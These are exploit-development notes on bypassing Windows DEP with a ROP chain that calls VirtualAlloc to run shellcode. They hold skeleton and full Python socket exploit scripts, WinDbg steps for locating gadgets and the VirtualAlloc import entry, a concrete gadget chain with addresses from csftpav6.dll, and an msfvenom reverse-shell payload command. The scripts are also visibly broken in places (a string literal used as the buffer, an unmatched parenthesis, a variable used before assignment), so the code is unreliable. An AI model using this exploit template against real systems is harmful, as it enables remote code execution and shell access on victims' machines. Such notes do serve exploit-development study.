# DEP Bypass

Uses Gadgets / Rop Chains to call the `VirtualAlloc` function and execute shellcode

### 1. Skeleton Starting Python Code
```
import socket
import sys
from struct import pack

# variables
SIZE = 500

# CommandBuffer
# These lines execute VirtualAlloc with shellcode
cb  = pack("<L", (0x45454545)) # dummy VirtualAlloc Address
cb += pack("<L", (0x46464646)) # Shellcode Return Address
cb += pack("<L", (0x47474747)) # # dummy Shellcode Address
cb += pack("<L", (0x48484848)) # dummy dwSize 
cb += pack("<L", (0x49494949)) # # dummy flAllocationType 
cb += pack("<L", (0x51515151)) # dummy flProtect

# buffer
offset = b'\x41' * SIZE
eip = b'\x42' * 4
rop = b'\x43' * (0x600 - SIZE - len(eip))

buf = b'offset + va + eip + rop'
print('[I] %s : %s' % (len(buf),buf)) # always good to print buffers to make sure they meet expectation

def main():
  if len(sys.argv) != 3:
    print('Usage: %s <ip_address> <port>\n' % (sys.argv[0]))
    sys.exit(1)

  server = sys.argv[1]
  port = sys.argv[2]
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((server, port))
  
  s.send(buf)
  s.close()

  print('[+] Packet sent')
  sys.exit()

if __name__ == '__main__':
  main()
```

### 2. Identify Offset  
...  

### 3. Find Bad Characters 
[Finding Bad Characters](https://github.com/cyberheisen/Penetration-Testing-Notes/blob/main/exploit_dev/identifying_bad_characters.md)  

### 4. Identify File(s) to use for Gadgets
* Files must not have DEP enabled.
* Files must not have bad characters in high bits of memory address
```
# Using Windbg
# list modules
>lm
start    end        module name
00190000 001c3000   snclientapi   (deferred)             
001d0000 001fd000   libcclog   (deferred)             
00400000 00c0c000   GraceServer   (deferred)             
012c0000 01302000   NLS        (deferred)             
01380000 013ab000   gsk8iccs   (deferred)             
01440000 0147a000   icclib019   (deferred)             
030d0000 031c0000   libeay32IBM019   (deferred)

>!dh -f <memory base address>
 ...
  # This means DEP/NX is enabled
    4140  DLL characteristics
            Dynamic base
            NX compatible
            Guard
  ...
  # No DEP enabled
  0  DLL characteristics
```

### 5.  Extract Gadgets from file
[ROPgadget](https://github.com/JonathanSalwan/ROPgadget)  

Using `rp-win-x86.exe`
```
C:\rp-win-x86 -f <file> -r <max number of instructions> > <output file>
```
Load the output file into Visual Studio Code or text editor to search.

### 6.  Access the Bytes containing the dummy VirtualAlloc Address

  1. Save the ESP register address into another register, such as EAX, EDI, or ESI.  This address will later be used with an offset to access the dummy VirtualAlloc Address.
     * Search the gadgets text file for suitable operations to accomplish this.
      - Gadget memory addresses cannot contain bad characters  
      - Remember top of the stack contains the function return address.    
     * Place first gadget into eip.  Subsequent gadgets should be in the 'rop' section
     * Sample searches
       ```
       push esp.* ; .* pop.* ; ret
       mov .*, esp
       xchg .*, esp
       xor .*, .* ; add .*, esp
       lea .*, esp
       sub .*, .*, adc .*, esi
       
       ```
       
    
     ```
      # rop chain
        eip = pack("<L", (0x505412f9))  # mov eax, ecx; ret;  :: csftpav6.dll | copy ecx address to eax
        rop = pack("<L", (0x505115a3))  # pop ecx; ret;  :: csftpav6.dll | pop the offset value into ecx
        rop += pack("<L", (0xffffe770)) # -1680 | offset value
        rop += pack("<L", (0x50533bea)) # sub eax, ecx; ret;  :: csftpav6.dll | subtract eax from ecx to get the start of the VirtualAlloc field
  
       ...
       buf = offset + cb + eip + rop 
       ```

### 7. Obtaining VirtualAlloc Address

```
#Using Windbg

>lm m <module name>
Browse full module list
start    end        module name
50500000 50577000   module_name   (export symbols)       C:\module_name.DLL

> !dh -f 50500000

File Type: DLL
FILE HEADER VALUES
     14C machine (i386)
       5 number of sections
4C056121 time date stamp Tue Jun  1 12:36:01 2010

       0 file pointer to symbol table
       0 number of symbols
      E0 size of optional header
    2102 characteristics
            Executable
            32 bit word machine
            DLL
...

       0  DLL characteristics
   53870 [    1068] address [size] of Export Directory
   52A2C [      50] address [size] of Import Directory
   60000 [   12500] address [size] of Resource Directory
       0 [       0] address [size] of Exception Directory
   71000 [    16A8] address [size] of Security Directory
   73000 [    2AF4] address [size] of Base Relocation Directory
       0 [       0] address [size] of Debug Directory
       0 [       0] address [size] of Description Directory
       0 [       0] address [size] of Special Directory
       0 [       0] address [size] of Thread Storage Directory
   523E0 [      40] address [size] of Load Configuration Directory
       0 [       0] address [size] of Bound Import Directory
   4A000 [     28C] address [size] of Import Address Table Directory  **** <--- IAT Address ****
       0 [       0] address [size] of Delay Import Directory
       0 [       0] address [size] of COR20 Header Directory
       0 [       0] address [size] of Reserved Directory
       
>dps 5054a000  +4a000 l28c
5054a000  757f0020 ADVAPI32!RegCreateKeyExA
5054a004  757efc10 ADVAPI32!RegOpenKeyExA
5054a008  757ef560 ADVAPI32!RegCloseKey
5054a00c  758138b0 ADVAPI32!RegSetValueA
5054a010  757e1200 ADVAPI32!RegQueryValueA
5054a014  757f02c0 ADVAPI32!RegDeleteKeyA
5054a018  757f2a70 ADVAPI32!RegEnumKeyA
...
5054a214  7596c990 KERNEL32!GetConsoleCP
5054a218  7596c9a0 KERNEL32!GetConsoleMode
5054a21c  7596c3c0 KERNEL32!FlushFileBuffers
5054a220  759638c0 KERNEL32!VirtualAllocStub  **** <--- VirtualAlloc Address ****
5054a224  75967120 KERNEL32!GetModuleHandleAStub
5054a228  759670d0 KERNEL32!RtlUnwindStub
5054a22c  7596ac40 KERNEL32!GetStringTypeAStub
5054a230  75966600 KERNEL32!GetStringTypeWStub
```
### 8. 


### Sample Script Structure

```
import socket
import sys
from struct import pack
import time

def check_bad_chars(badchars, buffer):
	badchars_hex = [f'{char:02x}' for char in badchars]
	print('[+] Checking payload for bad Characters:')
	print('\t[+] '+ str(badchars_hex))
	buffer_hex = [f'{char:02x}' for char in buffer]
	# for char in badchars:
	# 	badchars_hex.append(format(ord(char), '02x'))
	for index, b in enumerate(buffer_hex):
		#print('%s : %s' % (index,b))
		if b in (badchars_hex):
			print('[+] Bad character: %s detected at position %s in buffer' % (b,index))
			exit()
	print('[+] No bad characters found!')
	return False

badchars = b'\x00\x09\x0a\x0b\x0c\x0d\x20' # list discovered bad characters here
# badchars =  b''
# badchars += b'\x01\x02\x03\x04\x05\x06\x07\x08\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f'
# badchars += b'\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40'
# badchars += b'\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f'
# badchars += b'\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f'
# badchars += b'\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f'
# badchars += b'\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf'
# badchars += b'\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf'
# badchars += b'\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff'



# CommandBuffer
va = pack("<L", (0x45454545)) # placeholder VirtualAlloc Address
va += pack("<L", (0x46464646)) # Shellcode Return Address
va += pack("<L", (0x47474747)) # placeholder lpAddress
va += pack("<L", (0x48484848)) # placeholder dwSize 
va += pack("<L", (0x49494949)) # # placeholder flAllocationType 
va += pack("<L", (0x51515151)) # placeholder flProtect 

# offset
offset = b"A" * (276 - len(va))

# eip
eip =  pack("<L", (0x505412f9))  # mov eax, ecx; ret;  :: csftpav6.dll              | Move the ecx address to eax

# rop chain to fill in the virtualalloc placeholder values
rop =  pack("<L", (0x505115a3))  # pop ecx; ret;  :: csftpav6.dll                   | put virtualalloc placeholder address location offset into ecx 
rop += pack("<L", (0xffffe770)) # -1680                                             | virtualalloc placeholder address location offset
rop += pack("<L", (0x50533bea)) # sub eax, ecx; ret;  :: csftpav6.dll               | Subtract ecx from eax to obtain virtualalloc placeholder address location 
rop += pack("<L", (0x5052f773)) # push eax; pop esi; ret;  :: csftpav6.dll          | Save virtualalloc placeholder address location in esi
rop += pack("<L", (0x5053a0f5)) # pop eax; ret;  :: csftpav6.dll                    | Place VirtaulAlloc IAT address in EAX
rop += pack("<L", (0x5054a221)) # VirtualAlloc IAT + 1                              | VirtualAlloc IAT address + 1 (since \x20 is a bad character)
rop += pack("<L", (0x505115a3)) # pop ecx; ret;  :: csftpav6.dll                    | Move -1 into ECX
rop += pack("<L", (0xffffffff)) # -1 into ecx                                       | -1 Value for ECX
rop += pack("<L", (0x5051579a)) # add eax, ecx; ret;  :: csftpav6.dll               | add -1 to the VirtualAlloc IAT address
rop += pack("<L", (0x5051f278)) # mov eax, dword ptr [eax]; ret;  :: csftpav6.dll   | Place VirtualAlloc IAT address in eax
rop += pack("<L", (0x5051cbb6)) # mov dword ptr [esi], eax; ret;  :: csftpav6.dll   | Overwrite virtualalloc placeholder with VirtualAlloc address
rop += pack("<L", (0x50527946)) # inc esi; add al, 0x5e; ret; :: csftpav.dll		| +1 to esi
rop += pack("<L", (0x50527946)) # inc esi; add al, 0x5e; ret; :: csftpav.dll		| +1 to esi
rop += pack("<L", (0x50527946)) # inc esi; add al, 0x5e; ret; :: csftpav.dll		| +1 to esi
rop += pack("<L", (0x50527946)) # inc esi; add al, 0x5e; ret; :: csftpav.dll		| +1 to esi - Shellcode placeholder
rop += pack("<L", (0x505153de)) # mov eax, esi; pop esi; ret; 						| Copy shellcode placeholder address to eax and place junk value in esi
rop += pack("<L", (0x53535353)) # 0x53535353										| Junk value for ESI	
rop += pack("<L", (0x5052f773)) # push eax; pop esi; ret; 						    | copy shellcode placeholder address to esi
rop += pack("<L", (0x505115a3)) # pop ecx; ret;  :: csftpav6.dll                    | Place -0x210 into ECX
rop += pack("<L", (0xfffffdf0)) # - 0x210 into ecx									| -0x210 for ecx
rop += pack("<L", (0x50533bea)) # sub eax, ecx; ret;  :: csftpav6.dll               | Subtract ecx from eax to obtain shellcode address location 
rop += pack("<L", (0x5051cbb6)) # mov dword ptr [esi], eax; ret;  :: csftpav6.dll   | Overwrite shellcode placeholder with shellcode address

rop += pack("<L", (0x50527946)) # inc esi; add al, 0x5e; ret; :: csftpav.dll		| +1 to esi
rop += pack("<L", (0x50527946)) # inc esi; add al, 0x5e; ret; :: csftpav.dll		| +1 to esi
rop += pack("<L", (0x50527946)) # inc esi; add al, 0x5e; ret; :: csftpav.dll		| +1 to esi
rop += pack("<L", (0x50527946)) # inc esi; add al, 0x5e; ret; :: csftpav.dll		| +1 to esi - lpAddress placeholder
rop += pack("<L", (0x505153de)) # mov eax, esi; pop esi; ret; 					  | Copy lpAddress placeholder address to eax and place junk value in esi
rop += pack("<L", (0x53535353)) # 0x53535353									  | Junk value for ESI	
rop += pack("<L", (0x5052f773)) # push eax; pop esi; ret; 						  | copy lpAddress placeholder address to esi
rop += pack("<L", (0x505115a3)) # pop ecx; ret;  :: csftpav6.dll                  | Place -0x214 into ECX
rop += pack("<L", (0xfffffdec)) # - 0x214 into ecx								  | -0x214 for ecx
rop += pack("<L", (0x50533bea)) # sub eax, ecx; ret;  :: csftpav6.dll             | Subtract ecx from eax to obtain shellcode address location 
rop += pack("<L", (0x5051cbb6)) # mov dword ptr [esi], eax; ret;  :: csftpav6.dll | Overwrite lpAddress placeholder with shellcode address

rop += pack("<L", (0x50527946)) # inc esi; add al, 0x5e; ret; :: csftpav.dll		| +1 to esi
rop += pack("<L", (0x50527946)) # inc esi; add al, 0x5e; ret; :: csftpav.dll		| +1 to esi
rop += pack("<L", (0x50527946)) # inc esi; add al, 0x5e; ret; :: csftpav.dll		| +1 to esi
rop += pack("<L", (0x50527946)) # inc esi; add al, 0x5e; ret; :: csftpav.dll		| +1 to esi - dwSize placeholder
rop += pack("<L", (0x5053a0f5)) # pop eax; ret;  :: csftpav6.dll					| Save pointer to eax place -1 value in esi
rop += pack("<L", (0xffffffff)) # -1 												| -1	
rop += pack("<L", (0x5051d0ec)) # neg eax; ret;  :: csftpav6.dll					| negate -1 to +1
rop += pack("<L", (0x5051cbb6)) # mov dword ptr [esi], eax; ret;  :: csftpav6.dll   | Overwrite dwSize placeholder with shellcode address

rop += pack("<L", (0x50527946)) # inc esi; add al, 0x5e; ret; :: csftpav.dll		| +1 to esi
rop += pack("<L", (0x50527946)) # inc esi; add al, 0x5e; ret; :: csftpav.dll		| +1 to esi
rop += pack("<L", (0x50527946)) # inc esi; add al, 0x5e; ret; :: csftpav.dll		| +1 to esi
rop += pack("<L", (0x50527946)) # inc esi; add al, 0x5e; ret; :: csftpav.dll		| +1 to esi - flAllocationType placeholder
rop += pack("<L", (0x5053a0f5)) # pop eax; ret;  :: csftpav6.dll 					| Place 0x80808080 value in eax
rop += pack("<L", (0x80808080)) # 0x80808080										| 0x80808080
rop += pack("<L", (0x505115a3)) # pop ecx; ret;  :: csftpav6.dll					| Place 0x80807080 value into ecx
rop += pack("<L", (0x80807080)) # 0x80807080										| 0x80807080
rop += pack("<L", (0x50533bea)) # sub eax, ecx; ret;  :: csftpav6.dll               | Subtract ecx from eax to obtain flAllocationType value
rop += pack("<L", (0x5051cbb6)) # mov dword ptr [esi], eax; ret;  :: csftpav6.dll   | Overwrite flAllocationType placeholder with flAllocation value

rop += pack("<L", (0x50527946)) # inc esi; add al, 0x5e; ret; :: csftpav.dll		| +1 to esi
rop += pack("<L", (0x50527946)) # inc esi; add al, 0x5e; ret; :: csftpav.dll		| +1 to esi
rop += pack("<L", (0x50527946)) # inc esi; add al, 0x5e; ret; :: csftpav.dll		| +1 to esi
rop += pack("<L", (0x50527946)) # inc esi; add al, 0x5e; ret; :: csftpav.dll		| +1 to esi - flProtect placeholder
rop += pack("<L", (0x5053a0f5)) # pop eax; ret;  :: csftpav6.dll 					| Place 0x80808080 value in eax
rop += pack("<L", (0x80808080)) # 0x80808080										| 0x80808080
rop += pack("<L", (0x505115a3)) # pop ecx; ret;  :: csftpav6.dll					| Place 0x80807080 value into ecx
rop += pack("<L", (0x80808040)) # 0x80808040										| 0x80808040
rop += pack("<L", (0x50533bea)) # sub eax, ecx; ret;  :: csftpav6.dll               | Subtract ecx from eax to obtain flProtect value
rop += pack("<L", (0x5051cbb6)) # mov dword ptr [esi], eax; ret;  :: csftpav6.dll   | Overwrite flProtect placeholder with flProtect value

# Get the address for VirtualAloc
rop += pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn
rop += pack("<L", (0x42424242)) # junk
rop += pack("<L", (0x505115a3)) # pop ecx ; ret
rop += pack("<L", (0xffffffe8)) # negative offset value
rop += pack("<L", (0x5051579a)) # add eax, ecx ; ret
rop += pack("<L", (0x5051571f)) # xchg eax, ebp ; ret
rop += pack("<L", (0x50533cbf)) # mov esp, ebp ; pop ebp ; ret

#nopsled
padding = b'\x90' * 235

# msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -a x86  -b '\x00\x09\x0a\x0b\x0c\x0d\x20' -f python -v shellcode --platform windows -e x86/shikata_ga_nai

shellcode =  b""
shellcode += <some shellcode>

formatString = offset+va+eip+rop+padding+shellcode)

# check for bad characters
check_bad_chars(badchars,formatString)

# Checksum
buf = pack(">i", len(buf)-4) + buf



def main():
	if len(sys.argv) != 2:
		print("Usage: %s <ip_address>\n" % (sys.argv[0]))
		sys.exit(1)
	
	server = sys.argv[1]
	port = <some port>

  # this code attempts retries to connect
	attempt_count = 0
  max_retries = 6
	  
	while attempt_count < max_retries:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((server, port))
			print('[!] Sending Buffer - Size=%s : Date=%s ' % (len(buf),buf))
			s.send(buf)
			s.close()

			print("[+] Packet sent")
			sys.exit(0)
		except ConnectionRefusedError:
			retry_delay = 9
			print(f'[!] Connection Refused.  Attempt {attempt_count + 1} of {max_retries}.')
			attempt_count += 1
			while retry_delay > 0:
				print('Retry in %s\b\r' % retry_delay, end='\r')
				retry_delay -= 1
				time.sleep(1)
			


if __name__ == "__main__":
 	main()
```
